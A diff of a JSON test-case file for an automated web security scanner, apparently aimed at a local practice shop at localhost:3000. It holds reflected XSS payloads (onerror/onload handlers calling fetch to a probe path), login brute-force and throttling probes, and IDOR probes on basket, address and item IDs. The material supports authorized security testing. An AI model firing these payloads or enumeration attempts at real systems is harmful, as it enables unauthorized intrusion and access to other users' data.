@@ -1,85 +1,153 @@
 {
   "test_cases": [
     {
-      "id": "auth_flow_login",
-      "hypothesis_id": "POST_/rest/user/login_csrf_token_required_detection",
+      "id": "TC-LOGIN-BRUTEFORCE-THROTTLE-001",
+      "hypothesis_id": "POST /rest/user/login - login CSRF or brute-force",
+      "base_url": "http://localhost:3000",
       "method": "POST",
       "endpoint": "/rest/user/login",
-      "parameter": "email",
+      "parameter": "password",
       "param_location": "body",
       "payloads": [
         {
           "tier": "benign",
-          "value": "email=user%40example.com&password=badpass&csrf-token={{login_csrf}}",
-          "description": "Baseline login with valid CSRF token extracted from login form",
-          "encoding": "application/x-www-form-urlencoded",
-          "content_type": "application/x-www-form-urlencoded"
+          "value": "{\"email\":\"tester@example.com\",\"password\":\"CorrectHorseBatteryStaple1!\"}",
+          "description": "Baseline valid login attempt",
+          "encoding": "utf-8",
+          "content_type": "application/json"
         },
         {
           "tier": "probe",
-          "value": "email=user%40example.com&password=badpass",
-          "description": "Probe login without CSRF token to detect CSRF enforcement",
-          "encoding": "application/x-www-form-urlencoded",
-          "content_type": "application/x-www-form-urlencoded"
+          "value": "{\"email\":\"tester@example.com\",\"password\":\"incorrect-pass-{{RAND}}\"}",
+          "description": "Multiple safe invalid attempts to detect rate limits or throttling",
+          "encoding": "utf-8",
+          "content_type": "application/json"
         }
       ],
       "prerequisites": [
         {
-          "type": "csrf_token",
-          "description": "Extract CSRF token from login page form and bind to login_csrf",
-          "extract_from": "/rest/user/login GET response form",
-          "bind_to": "login_csrf"
+          "type": "custom",
+          "description": "No auth required for initial login; capture CSRF token if present on login form",
+          "custom_logic": "Parse login page for CSRF hidden field or JS token and include in payload if found"
         }
       ],
       "oracle_rules": [
         {
+          "signal": "timing_anomaly",
+          "condition": "Observe response time increases > baseline + 3000ms indicating throttling",
+          "threshold": {
+            "timing_ms": 3000
+          },
+          "weight": 0.8
+        },
+        {
           "signal": "status_code_change",
-          "condition": "probe.response.status_code != baseline.response.status_code",
+          "condition": "Different status codes (200 vs 401 vs 429) observed between valid, invalid and blocked attempts",
           "threshold": {
             "expected_codes": [
               200,
               401,
-              403
+              429
             ]
           },
           "weight": 1.0
-        },
-        {
-          "signal": "reflected_input",
-          "condition": "baseline.response.body contains email OR probe.response.body contains email",
-          "threshold": {
-            "body_length_delta_pct": 10.0
-          },
-          "weight": 0.5
         }
       ],
       "pass_logic": "any",
       "safety": {
         "idempotent_required": true,
         "destructive_ok": false,
-        "max_requests": 20
+        "max_requests": 100
       },
-      "max_retries": 1,
-      "delay_between_requests": 1.0,
-      "notes": "Establish session first. Do not perform credential stuffing; use dummy credentials.",
+      "max_retries": 3,
+      "delay_between_requests": 2.0,
+      "notes": "Start with single benign login to establish session. Perform low-frequency invalid attempts and monitor for 429/long response times. Stop if IP blocked.",
       "tags": [
-        "authentication",
-        "csrf"
+        "auth",
+        "bruteforce",
+        "throttle"
       ],
-      "estimated_duration": 30
+      "estimated_duration": 600
     },
     {
-      "id": "gather_whoami",
-      "hypothesis_id": "GET_/rest/user/whoami_privilege_escalation_possible",
+      "id": "TC-ADMIN-CONFIG-AUTHZ-001",
+      "hypothesis_id": "GET /rest/admin/application-configuration - admin access control",
+      "base_url": "http://localhost:3000",
       "method": "GET",
-      "endpoint": "/rest/user/whoami",
-      "parameter": "user",
+      "endpoint": "/rest/admin/application-configuration",
+      "parameter": "application",
       "param_location": "query",
       "payloads": [
         {
           "tier": "benign",
-          "value": "",
-          "description": "Baseline whoami under authenticated session to collect identity and roles",
+          "value": "/rest/admin/application-configuration",
+          "description": "Baseline request as admin (if available)",
+          "content_type": "application/json"
+        },
+        {
+          "tier": "probe",
+          "value": "/rest/admin/application-configuration",
+          "description": "Request endpoint as non-admin to detect access control failures",
+          "content_type": "application/json"
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "login",
+          "description": "Authenticate as non-admin user and admin user to compare responses; session cookie or bearer token required",
+          "extract_from": "response.headers['set-cookie']",
+          "bind_to": "session_cookie"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "status_code_change",
+          "condition": "Non-admin vs admin response codes compared (expect 200 for admin, 401/403 for non-admin). If non-admin receives 200, flag as authz bypass.",
+          "threshold": {
+            "expected_codes": [
+              200,
+              403,
+              401
+            ]
+          },
+          "weight": 1.0
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 15
+      },
+      "max_retries": 1,
+      "delay_between_requests": 2.0,
+      "notes": "Run after login tests. Do not attempt privilege escalation.",
+      "tags": [
+        "authz",
+        "admin"
+      ],
+      "estimated_duration": 200
+    },
+    {
+      "id": "TC-DATA-EXPORT-EXFIL-001",
+      "hypothesis_id": "POST /rest/user/data-export - data exfiltration trigger",
+      "base_url": "http://localhost:3000",
+      "method": "POST",
+      "endpoint": "/rest/user/data-export",
+      "parameter": "format",
+      "param_location": "body",
+      "payloads": [
+        {
+          "tier": "benign",
+          "value": "{\"format\":\"json\",\"confirmation\":true}",
+          "description": "Baseline export request",
+          "encoding": "utf-8",
+          "content_type": "application/json"
+        },
+        {
+          "tier": "probe",
+          "value": "{\"format\":\"json\",\"confirmation\":true}",
+          "description": "Request export and observe response size and content",
           "encoding": "utf-8",
           "content_type": "application/json"
         }
@@ -87,14 +155,86 @@
       "prerequisites": [
         {
           "type": "login",
-          "description": "Requires authenticated session; use cookie from auth_flow_login"
+          "description": "Authenticate as user; session cookie or bearer token required",
+          "extract_from": "response.headers['set-cookie']",
+          "bind_to": "session_cookie"
         }
       ],
       "oracle_rules": [
         {
           "signal": "sensitive_data_exposed",
-          "condition": "response.body contains identity fields or role attributes (e.g., 'admin', 'roles', 'email')",
+          "condition": "Export response contains user data payloads or downloadable content with PII",
           "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "Export response length increases by >50% compared to baseline indicating user data included",
+          "threshold": {
+            "body_length_delta_pct": 50.0
+          },
+          "weight": 0.8
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 10
+      },
+      "max_retries": 1,
+      "delay_between_requests": 3.0,
+      "notes": "Perform after successful authentication. Abort and do not store PII if large export detected.",
+      "tags": [
+        "data_exfiltration",
+        "privacy"
+      ],
+      "estimated_duration": 240
+    },
+    {
+      "id": "TC-CARDS-SENSITIVE-001",
+      "hypothesis_id": "POST /api/Cards/ - card number sensitive",
+      "base_url": "http://localhost:3000",
+      "method": "POST",
+      "endpoint": "/api/Cards/",
+      "parameter": "cardNum",
+      "param_location": "body",
+      "payloads": [
+        {
+          "tier": "benign",
+          "value": "{\"cardNum\":\"4111111111111111\",\"fullName\":\"Alice Tester\"}",
+          "description": "Baseline valid card payload (use test PAN)",
+          "encoding": "utf-8",
+          "content_type": "application/json"
+        },
+        {
+          "tier": "probe",
+          "value": "{\"cardNum\":\"PROBE_CARD_{{RAND}}\",\"fullName\":\"Alice Tester\"}",
+          "description": "Probe to detect echoing or tokenization behavior",
+          "encoding": "utf-8",
+          "content_type": "application/json"
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "login",
+          "description": "Authenticate as normal user; session cookie or bearer token required",
+          "extract_from": "response.headers['set-cookie']",
+          "bind_to": "session_cookie"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "sensitive_data_exposed",
+          "condition": "Submitted cardNum or PAN appears in any API response bodies or in other endpoints responses",
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "Response body length changes by more than threshold after submitting cardNum (indicating tokenization or echo)",
+          "threshold": {
+            "body_length_delta_pct": 20.0
+          },
+          "weight": 0.8
         }
       ],
       "pass_logic": "any",
@@ -103,84 +243,19 @@
         "destructive_ok": false,
         "max_requests": 20
       },
-      "max_retries": 1,
-      "delay_between_requests": 1.0,
-      "notes": "High priority for enumeration. Capture only metadata.",
+      "max_retries": 2,
+      "delay_between_requests": 2.0,
+      "notes": "Use PCI test PANs only. Run after login. Monitor other endpoints for PAN leakage.",
       "tags": [
-        "enumeration",
-        "identity"
+        "sensitive_data",
+        "pci"
       ],
-      "estimated_duration": 20
+      "estimated_duration": 180
     },
     {
-      "id": "high_priority_idor_basket_enumeration",
-      "hypothesis_id": "GET_/rest/basket/:int_idor_readonly_access",
-      "method": "GET",
-      "endpoint": "/rest/basket/:int",
-      "parameter": "basketId",
-      "param_location": "path",
-      "payloads": [
-        {
-          "tier": "benign",
-          "value": "",
-          "description": "Fetch own basket id for baseline",
-          "encoding": "utf-8",
-          "content_type": "application/json"
-        },
-        {
-          "tier": "probe",
-          "value": "",
-          "description": "Probe other basket ids sequentially (limited range) to detect IDOR",
-          "encoding": "utf-8",
-          "content_type": "application/json"
-        }
-      ],
-      "prerequisites": [
-        {
-          "type": "login",
-          "description": "Authenticated session required; use session from auth_flow_login"
-        }
-      ],
-      "oracle_rules": [
-        {
-          "signal": "status_code_change",
-          "condition": "probe.response.status_code not in baseline.status_code",
-          "threshold": {
-            "expected_codes": [
-              200,
-              403,
-              404
-            ]
-          },
-          "weight": 1.0
-        },
-        {
-          "signal": "response_length_diff",
-          "condition": "abs(len(probe.response.body)-len(baseline.response.body))/max(1,len(baseline.response.body)) > 0.40",
-          "threshold": {
-            "body_length_delta_pct": 40.0
-          },
-          "weight": 1.0
-        }
-      ],
-      "pass_logic": "any",
-      "safety": {
-        "idempotent_required": true,
-        "destructive_ok": false,
-        "max_requests": 60
-      },
-      "max_retries": 1,
-      "delay_between_requests": 1.5,
-      "notes": "Priority: probe limited id range (e.g., +/-5) to reduce noise. Stop if 403 returned consistently.",
-      "tags": [
-        "idor",
-        "high-priority"
-      ],
-      "estimated_duration": 90
-    },
-    {
-      "id": "id_access_addresss",
-      "hypothesis_id": "GET_/api/Addresss/:int_id_path_idor",
+      "id": "TC-ADDRESS-ID-1-IDOR-001",
+      "hypothesis_id": "GET /api/Addresss/:int - IDOR address read",
+      "base_url": "http://localhost:3000",
       "method": "GET",
       "endpoint": "/api/Addresss/:int",
       "parameter": "id",
@@ -188,109 +263,35 @@
       "payloads": [
         {
           "tier": "benign",
-          "value": "",
-          "description": "Fetch own address id for baseline",
-          "encoding": "utf-8",
+          "value": "/api/Addresss/1",
+          "description": "Baseline GET own address id",
           "content_type": "application/json"
         },
         {
           "tier": "probe",
-          "value": "",
-          "description": "Probe nearby address ids to detect authorization bypass",
-          "encoding": "utf-8",
+          "value": "/api/Addresss/2",
+          "description": "Probe other numeric ids to detect access without proper authz",
           "content_type": "application/json"
         }
       ],
       "prerequisites": [
         {
           "type": "login",
-          "description": "Authenticated session required"
+          "description": "Authenticate as user; session cookie or bearer token required",
+          "extract_from": "response.headers['set-cookie']",
+          "bind_to": "session_cookie"
         }
       ],
       "oracle_rules": [
         {
           "signal": "status_code_change",
-          "condition": "probe.response.status_code not in baseline.status_code",
+          "condition": "Probe other ids return 200 (data) vs 403/404 indicating missing authz",
           "threshold": {
             "expected_codes": [
               200,
               403,
               404
             ]
-          },
-          "weight": 1.0
-        },
-        {
-          "signal": "response_length_diff",
-          "condition": "abs(len(probe.response.body)-len(baseline.response.body))/max(1,len(baseline.response.body)) > 0.30",
-          "threshold": {
-            "body_length_delta_pct": 30.0
-          },
-          "weight": 1.0
-        }
-      ],
-      "pass_logic": "any",
-      "safety": {
-        "idempotent_required": true,
-        "destructive_ok": false,
-        "max_requests": 40
-      },
-      "max_retries": 1,
-      "delay_between_requests": 1.0,
-      "notes": "Limit enumeration; cease if access denied or anomalies detected.",
-      "tags": [
-        "idor",
-        "authz"
-      ],
-      "estimated_duration": 60
-    },
-    {
-      "id": "basket_item_tampering_probe",
-      "hypothesis_id": "POST_/api/BasketItems_/parameter_tampering_quantity",
-      "method": "POST",
-      "endpoint": "/api/BasketItems/",
-      "parameter": "quantity",
-      "param_location": "body",
-      "payloads": [
-        {
-          "tier": "benign",
-          "value": "{\"BasketId\":1,\"ProductId\":1,\"quantity\":1}",
-          "description": "Add item baseline",
-          "encoding": "utf-8",
-          "content_type": "application/json"
-        },
-        {
-          "tier": "probe",
-          "value": "{\"BasketId\":1,\"ProductId\":1,\"quantity\":9999}",
-          "description": "Probe for validation/authz differences",
-          "encoding": "utf-8",
-          "content_type": "application/json"
-        }
-      ],
-      "prerequisites": [
-        {
-          "type": "login",
-          "description": "Authenticated session required; use basket created in benign step"
-        }
-      ],
-      "oracle_rules": [
-        {
-          "signal": "status_code_change",
-          "condition": "probe.response.status_code not in baseline.status_code",
-          "threshold": {
-            "expected_codes": [
-              200,
-              403,
-              404
-            ]
-          },
-          "weight": 1.0
-        },
-        {
-          "signal": "response_length_diff",
-          "condition": "abs(len(probe.response.body)-len(baseline.response.body))/max(1,len(baseline.response.body)) > 0.30",
-          "threshold": {
-            "body_length_delta_pct": 30.0
           },
           "weight": 1.0
         }
@@ -301,48 +302,49 @@
         "destructive_ok": false,
         "max_requests": 50
       },
-      "max_retries": 1,
+      "max_retries": 2,
       "delay_between_requests": 1.0,
-      "notes": "Do not create real orders. Restore quantity if modified.",
+      "notes": "Run after authentication. Use sequential ids cautiously and stop on evidence of sensitive PII exposure.",
       "tags": [
-        "tampering",
-        "authz"
+        "idor",
+        "read"
       ],
-      "estimated_duration": 60
+      "estimated_duration": 200
     },
     {
-      "id": "put_basketitems_idor_probe",
-      "hypothesis_id": "PUT_/api/BasketItems/:int_idor_or_unauthorized_modify",
-      "method": "PUT",
-      "endpoint": "/api/BasketItems/:int",
-      "parameter": "id",
+      "id": "TC-BASKET-ID-EXPOSURE-001",
+      "hypothesis_id": "GET /rest/basket/:int - basketId exposure",
+      "base_url": "http://localhost:3000",
+      "method": "GET",
+      "endpoint": "/rest/basket/:int",
+      "parameter": "basketId",
       "param_location": "path",
       "payloads": [
         {
           "tier": "benign",
-          "value": "{\"quantity\":1}",
-          "description": "Baseline update to owned item",
-          "encoding": "utf-8",
+          "value": "/rest/basket/1",
+          "description": "Baseline GET own basket",
           "content_type": "application/json"
         },
         {
           "tier": "probe",
-          "value": "{\"quantity\":2}",
-          "description": "Attempt update on other ids to detect missing authz",
-          "encoding": "utf-8",
+          "value": "/rest/basket/2",
+          "description": "Probe other basket ids to detect unauthorized access",
           "content_type": "application/json"
         }
       ],
       "prerequisites": [
         {
           "type": "login",
-          "description": "Authenticated session required"
+          "description": "Authenticate as user; session cookie or bearer token required",
+          "extract_from": "response.headers['set-cookie']",
+          "bind_to": "session_cookie"
         }
       ],
       "oracle_rules": [
         {
           "signal": "status_code_change",
-          "condition": "probe.response.status_code not in baseline.status_code",
+          "condition": "Other basket ids returning 200 with contents indicates IDOR",
           "threshold": {
             "expected_codes": [
               200,
@@ -351,12 +353,187 @@
             ]
           },
           "weight": 1.0
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 100
+      },
+      "max_retries": 2,
+      "delay_between_requests": 1.0,
+      "notes": "Do not view or store PII. Use tester-owned ids where possible.",
+      "tags": [
+        "idor",
+        "basket"
+      ],
+      "estimated_duration": 200
+    },
+    {
+      "id": "TC-BASKET-PRODUCTID-AUTHZ-001",
+      "hypothesis_id": "POST /api/BasketItems/ - productId parameter injection",
+      "base_url": "http://localhost:3000",
+      "method": "POST",
+      "endpoint": "/api/BasketItems/",
+      "parameter": "ProductId",
+      "param_location": "body",
+      "payloads": [
+        {
+          "tier": "benign",
+          "value": "{\"BasketId\":1,\"ProductId\":101,\"quantity\":1}",
+          "description": "Baseline add-to-basket request",
+          "encoding": "utf-8",
+          "content_type": "application/json"
         },
         {
-          "signal": "response_length_diff",
-          "condition": "abs(len(probe.response.body)-len(baseline.response.body))/max(1,len(baseline.response.body)) > 0.30",
+          "tier": "probe",
+          "value": "{\"BasketId\":1,\"ProductId\":99999,\"quantity\":1}",
+          "description": "Probe with other product id to observe status changes or auth checks",
+          "encoding": "utf-8",
+          "content_type": "application/json"
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "login",
+          "description": "Authenticate as normal user; session cookie or bearer token required",
+          "extract_from": "response.headers['set-cookie']",
+          "bind_to": "session_cookie"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "status_code_change",
+          "condition": "Compare status codes for baseline vs probe ProductId (200 vs 403/404) to infer authz checks",
           "threshold": {
-            "body_length_delta_pct": 30.0
+            "expected_codes": [
+              200,
+              403,
+              404
+            ]
+          },
+          "weight": 1.0
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 30
+      },
+      "max_retries": 1,
+      "delay_between_requests": 1.0,
+      "notes": "Clean up any created items. Avoid creating orders.",
+      "tags": [
+        "authz",
+        "idor"
+      ],
+      "estimated_duration": 120
+    },
+    {
+      "id": "TC-BASKET-CHECKOUT-AUTHZ-001",
+      "hypothesis_id": "POST /rest/basket/:int/checkout - path basketId authz",
+      "base_url": "http://localhost:3000",
+      "method": "POST",
+      "endpoint": "/rest/basket/:int/checkout",
+      "parameter": "basketId",
+      "param_location": "path",
+      "payloads": [
+        {
+          "tier": "benign",
+          "value": "{\"orderDetails\":{\"addressId\":1,\"deliveryMethodId\":1,\"paymentId\":1}}",
+          "description": "Baseline checkout request for own basketId",
+          "encoding": "utf-8",
+          "content_type": "application/json"
+        },
+        {
+          "tier": "probe",
+          "value": "{\"orderDetails\":{\"addressId\":1,\"deliveryMethodId\":1,\"paymentId\":1}}",
+          "description": "Probe attempting checkout on other basketId path (replace path id)",
+          "encoding": "utf-8",
+          "content_type": "application/json"
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "login",
+          "description": "Authenticate as user; session cookie or bearer token required",
+          "extract_from": "response.headers['set-cookie']",
+          "bind_to": "session_cookie"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "status_code_change",
+          "condition": "Compare response codes for checkout on own basketId vs other basketId (200 vs 403/404) indicating authz enforcement",
+          "threshold": {
+            "expected_codes": [
+              200,
+              403,
+              404
+            ]
+          },
+          "weight": 1.0
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 25
+      },
+      "max_retries": 1,
+      "delay_between_requests": 2.0,
+      "notes": "Do not perform real purchases. Abort if payment flow initiated.",
+      "tags": [
+        "authz",
+        "checkout"
+      ],
+      "estimated_duration": 180
+    },
+    {
+      "id": "TC-BASKETITEMS-ID-AUTHZ-001",
+      "hypothesis_id": "PUT /api/BasketItems/:int - id parameter authz",
+      "base_url": "http://localhost:3000",
+      "method": "PUT",
+      "endpoint": "/api/BasketItems/:int",
+      "parameter": "id",
+      "param_location": "path",
+      "payloads": [
+        {
+          "tier": "benign",
+          "value": "{\"quantity\":2}",
+          "description": "Baseline update to own basket item",
+          "encoding": "utf-8",
+          "content_type": "application/json"
+        },
+        {
+          "tier": "probe",
+          "value": "{\"quantity\":1}",
+          "description": "Probe updating other item id to detect authz enforcement",
+          "encoding": "utf-8",
+          "content_type": "application/json"
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "login",
+          "description": "Authenticate as user; session cookie or bearer token required",
+          "extract_from": "response.headers['set-cookie']",
+          "bind_to": "session_cookie"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "status_code_change",
+          "condition": "Compare PUT responses for own id vs other ids (200 vs 403/404) to detect missing authz",
+          "threshold": {
+            "expected_codes": [
+              200,
+              403,
+              404
+            ]
           },
           "weight": 1.0
         }
@@ -369,16 +546,17 @@
       },
       "max_retries": 1,
       "delay_between_requests": 1.5,
-      "notes": "If update succeeds on other ids, stop further probes and escalate.",
+      "notes": "Use probe ids that are non-destructive. Clean up modified items.",
       "tags": [
-        "idor",
-        "authz"
+        "authz",
+        "idor"
       ],
-      "estimated_duration": 60
+      "estimated_duration": 150
     },
     {
-      "id": "delete_basketitems_authz_probe",
-      "hypothesis_id": "DELETE_/api/BasketItems/:int_unauthorized_deletion",
+      "id": "TC-BASKETITEMS-DELETE-AUTHZ-001",
+      "hypothesis_id": "DELETE /api/BasketItems/:int - delete id authz",
+      "base_url": "http://localhost:3000",
       "method": "DELETE",
       "endpoint": "/api/BasketItems/:int",
       "parameter": "id",
@@ -387,43 +565,34 @@
         {
           "tier": "benign",
           "value": "",
-          "description": "Baseline delete on non-critical owned item",
-          "encoding": "utf-8",
+          "description": "Baseline delete own item (if exists) - ensure safe target",
           "content_type": "application/json"
         },
         {
           "tier": "probe",
           "value": "",
-          "description": "Attempt delete on other item ids to detect authz issues (do not delete critical resources)",
-          "encoding": "utf-8",
+          "description": "Attempt DELETE on another user's item id (probe only)",
           "content_type": "application/json"
         }
       ],
       "prerequisites": [
         {
           "type": "login",
-          "description": "Authenticated session required"
+          "description": "Authenticate as user; session cookie or bearer token required",
+          "extract_from": "response.headers['set-cookie']",
+          "bind_to": "session_cookie"
         }
       ],
       "oracle_rules": [
         {
           "signal": "status_code_change",
-          "condition": "probe.response.status_code not in baseline.status_code",
+          "condition": "Compare DELETE responses for own id vs other ids (200 vs 403/404) to detect missing authz",
           "threshold": {
             "expected_codes": [
               200,
-              401,
               403,
               404
             ]
-          },
-          "weight": 1.0
-        },
-        {
-          "signal": "response_length_diff",
-          "condition": "abs(len(probe.response.body)-len(baseline.response.body))/max(1,len(baseline.response.body)) > 0.25",
-          "threshold": {
-            "body_length_delta_pct": 25.0
           },
           "weight": 1.0
         }
@@ -435,147 +604,39 @@
         "max_requests": 20
       },
       "max_retries": 1,
-      "delay_between_requests": 2.0,
-      "notes": "Prefer test environment. Restore if deletion occurs.",
+      "delay_between_requests": 1.5,
+      "notes": "Avoid deleting real user data. Use safe probe ids.",
       "tags": [
         "authz",
-        "deletion"
-      ],
-      "estimated_duration": 60
-    },
-    {
-      "id": "products_enumeration",
-      "hypothesis_id": "GET_/api/Products/:int_idor_info_disclosure",
-      "method": "GET",
-      "endpoint": "/api/Products/:int",
-      "parameter": "id",
-      "param_location": "path",
-      "payloads": [
-        {
-          "tier": "benign",
-          "value": "",
-          "description": "Fetch known product id as baseline",
-          "encoding": "utf-8",
-          "content_type": "application/json"
-        },
-        {
-          "tier": "probe",
-          "value": "",
-          "description": "Enumerate product ids within small range to detect anomalies",
-          "encoding": "utf-8",
-          "content_type": "application/json"
-        }
-      ],
-      "prerequisites": [],
-      "oracle_rules": [
-        {
-          "signal": "response_length_diff",
-          "condition": "abs(len(probe.response.body)-len(baseline.response.body))/max(1,len(baseline.response.body)) > 0.30",
-          "threshold": {
-            "body_length_delta_pct": 30.0
-          },
-          "weight": 1.0
-        },
-        {
-          "signal": "status_code_change",
-          "condition": "probe.response.status_code not in baseline.status_code",
-          "threshold": {
-            "expected_codes": [
-              200,
-              404
-            ]
-          },
-          "weight": 0.5
-        }
-      ],
-      "pass_logic": "any",
-      "safety": {
-        "idempotent_required": true,
-        "destructive_ok": false,
-        "max_requests": 100
-      },
-      "max_retries": 1,
-      "delay_between_requests": 0.5,
-      "notes": "Limit scraping; respect robots and rate limits.",
-      "tags": [
-        "enumeration",
-        "info-disclosure"
+        "delete"
       ],
       "estimated_duration": 120
     },
     {
-      "id": "search_xss_probe",
-      "hypothesis_id": "GET_/rest/products/search_query_injection_xss",
-      "method": "GET",
-      "endpoint": "/rest/products/search",
-      "parameter": "name",
-      "param_location": "query",
-      "payloads": [
-        {
-          "tier": "benign",
-          "value": "?name=widget",
-          "description": "Baseline search",
-          "encoding": "utf-8",
-          "content_type": "application/json"
-        },
-        {
-          "tier": "probe",
-          "value": "?name=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E",
-          "description": "Reflected XSS probe URL-encoded",
-          "encoding": "utf-8",
-          "content_type": "application/json"
-        }
-      ],
-      "prerequisites": [],
-      "oracle_rules": [
-        {
-          "signal": "xss_payload_executed",
-          "condition": "payload execution observed in isolated browser or payload appears unescaped in response",
-          "weight": 1.0
-        },
-        {
-          "signal": "reflected_input",
-          "condition": "probe value appears in response.body",
-          "threshold": {
-            "body_length_delta_pct": 15.0
-          },
-          "weight": 0.5
-        }
-      ],
-      "pass_logic": "any",
-      "safety": {
-        "idempotent_required": true,
-        "destructive_ok": false,
-        "max_requests": 200
-      },
-      "max_retries": 1,
-      "delay_between_requests": 0.5,
-      "notes": "Validate XSS in isolated environment only.",
-      "tags": [
-        "xss",
-        "search"
-      ],
-      "estimated_duration": 45
-    },
-    {
-      "id": "challenges_xss_probe",
-      "hypothesis_id": "GET_/api/Challenges_/xss_in_query_fields",
+      "id": "TC-CHALLENGES-REFLECTED-XSS-001",
+      "hypothesis_id": "GET /api/Challenges/ - key parameter injection/XSS",
+      "base_url": "http://localhost:3000",
       "method": "GET",
       "endpoint": "/api/Challenges/",
-      "parameter": "description",
+      "parameter": "key",
       "param_location": "query",
       "payloads": [
         {
           "tier": "benign",
-          "value": "?description=normal",
-          "description": "Baseline",
-          "encoding": "utf-8",
+          "value": "/api/Challenges?key=test",
+          "description": "Baseline query",
           "content_type": "application/json"
         },
         {
           "tier": "probe",
-          "value": "?description=%3Csvg%2Fonload%3Dalert(1)%3E",
-          "description": "Reflected XSS probe URL-encoded",
+          "value": "/api/Challenges?key=INJECT_MARKER_{{RAND}}",
+          "description": "Probe to detect reflection in JSON or HTML",
+          "content_type": "application/json"
+        },
+        {
+          "tier": "exploit",
+          "value": "/api/Challenges?key=<img src=x onerror=fetch('/__probe?m=INJECT_MARKER_{{RAND}}')>",
+          "description": "XSS probe to detect execution when rendered",
           "encoding": "utf-8",
           "content_type": "application/json"
         }
@@ -583,13 +644,222 @@
       "prerequisites": [
         {
           "type": "login",
-          "description": "May require authenticated session; perform after whoami if needed"
+          "description": "Authenticate if required (session cookie or bearer token may be required)",
+          "extract_from": "response.headers['set-cookie']",
+          "bind_to": "session_cookie"
         }
       ],
       "oracle_rules": [
         {
+          "signal": "reflected_input",
+          "condition": "Probe marker present in endpoint response body or in subsequent rendered pages",
+          "threshold": {
+            "body_length_delta_pct": 20.0
+          },
+          "weight": 1.0
+        },
+        {
           "signal": "xss_payload_executed",
-          "condition": "probe payload executes in browser or appears unescaped in response",
+          "condition": "Browser-executed payload observed via callback to controlled endpoint",
+          "weight": 1.0
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 30
+      },
+      "max_retries": 2,
+      "delay_between_requests": 1.5,
+      "notes": "Run reflected probes after authentication step. Use callback listener to detect execution.",
+      "tags": [
+        "xss",
+        "reflected"
+      ],
+      "estimated_duration": 240
+    },
+    {
+      "id": "TC-SEARCH-REFLECTED-XSS-001",
+      "hypothesis_id": "GET /rest/products/search - name query injection",
+      "base_url": "http://localhost:3000",
+      "method": "GET",
+      "endpoint": "/rest/products/search",
+      "parameter": "name",
+      "param_location": "query",
+      "payloads": [
+        {
+          "tier": "benign",
+          "value": "/rest/products/search?name=test",
+          "description": "Baseline search",
+          "content_type": "application/json"
+        },
+        {
+          "tier": "probe",
+          "value": "/rest/products/search?name=INJECT_MARKER_{{RAND}}",
+          "description": "Probe to detect reflection in results",
+          "content_type": "application/json"
+        },
+        {
+          "tier": "exploit",
+          "value": "/rest/products/search?name=<svg/onload=fetch('/__probe?m=INJECT_MARKER_{{RAND}}')>",
+          "description": "XSS probe for rendered search results",
+          "encoding": "utf-8",
+          "content_type": "application/json"
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "custom",
+          "description": "Authenticate if required; include session cookie if available"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "reflected_input",
+          "condition": "Probe marker appears in JSON response or rendered HTML search results",
+          "threshold": {
+            "body_length_delta_pct": 20.0
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "xss_payload_executed",
+          "condition": "Browser executes injected script when search results rendered (callback observed)",
+          "weight": 1.0
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 40
+      },
+      "max_retries": 2,
+      "delay_between_requests": 1.0,
+      "notes": "Perform after info-gathering. Use markers and low-frequency probes.",
+      "tags": [
+        "xss",
+        "search"
+      ],
+      "estimated_duration": 240
+    },
+    {
+      "id": "TC-BASKETITEMS-DATA-REFLECTED-XSS-001",
+      "hypothesis_id": "GET /api/BasketItems/:int - data param reflected",
+      "base_url": "http://localhost:3000",
+      "method": "GET",
+      "endpoint": "/api/BasketItems/:int",
+      "parameter": "data",
+      "param_location": "query",
+      "payloads": [
+        {
+          "tier": "benign",
+          "value": "/api/BasketItems/1",
+          "description": "Baseline GET",
+          "content_type": "application/json"
+        },
+        {
+          "tier": "probe",
+          "value": "/api/BasketItems/1?data=INJECT_MARKER_{{RAND}}",
+          "description": "Probe to detect reflection in response or UI",
+          "content_type": "application/json"
+        },
+        {
+          "tier": "exploit",
+          "value": "/api/BasketItems/1?data=<svg/onload=fetch('/__probe?m=INJECT_MARKER_{{RAND}}')>",
+          "description": "XSS probe when rendered",
+          "encoding": "utf-8",
+          "content_type": "application/json"
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "login",
+          "description": "Authenticate as user; session cookie or bearer token required",
+          "extract_from": "response.headers['set-cookie']",
+          "bind_to": "session_cookie"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "reflected_input",
+          "condition": "Probe marker appears in JSON response or rendered UI",
+          "threshold": {
+            "body_length_delta_pct": 20.0
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "xss_payload_executed",
+          "condition": "Payload execution observed when item displayed in UI (callback)",
+          "weight": 1.0
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 40
+      },
+      "max_retries": 2,
+      "delay_between_requests": 1.5,
